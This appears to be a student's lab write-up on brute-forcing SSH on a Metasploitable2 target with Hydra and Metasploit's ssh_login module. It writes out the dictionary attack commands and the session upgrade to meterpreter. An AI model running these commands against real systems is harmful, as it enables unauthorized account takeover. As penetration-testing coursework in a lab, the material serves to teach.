Brute Force Attack of Port 22 running OpenSSH

Result from the Nmap scan shows that port 22 is open and its running OpenSSH (OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)), thereby presenting a vulnearbility that could be exploited. 

This exploit I did with both Hydra and Metasploit and both of them involved brute forcing  my way into the target machine. First I created a file Users.txt containing some usernames and another file Passwords.txt containing matching passwords. Below were the steps taken for the Hydra Brute Force attack.

I launched hydra to use the provided username and password dictionary to brute force into the machine. 

```commandline
hydra -L /home/kali/Users.txt -P /home/kali/Passwords.txt 10.0.200.5 ssh
```

With the username and password, I proceeded to access the files on the machine

```commandline
ssh msfadmin@10.0.200.5
```

Using Metasploit for the same brute force attack, the following steps were carried out

Launched metasploit and searched for ssh_login. The result brought back two attack modules were available. I picked the first one "auxiliary/scanner/ssh/ssh_login".

Next I requested for the required options for the exploit to be executed.

```commandline
show options
```

Some of the requirements which needed to be provided are rhosts (Remote Host) which is the ip address of the target machine, user_file, pass_file and the value of stop_on_success to true. After which I began the exploit.

```commandline
msf6 auxiliary(scanner/ssh/ssh_login) > set rhost 10.0.200.5
rhost => 10.0.200.5
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /home/kali/Users.txt
USER_FILE => /home/kali/Users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/kali/Passwords.txt
PASS_FILE => /home/kali/Passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/ssh/ssh_login) > exploit

```

Once a correct  set of username and password has been gotten, metasploiter stops the brute force attack based on the the settings I made, it then uses this login credentials to gain access into the metasploiter2 machine and opens a session through which i can then launch meterpreter (meterpreter is a metasploit penetration tools that gives an attacker access to execute commands and access files as though the attacker were on the target machine) on a new session. To do this, i asked metasploit to use the session 1 which it had opened (sessions -u 1) to open a new session, session 2, from which I used (sessions 2) to open meterpreter.

```commandline
sessions -u 1
```

```commandline
sessions 2
```
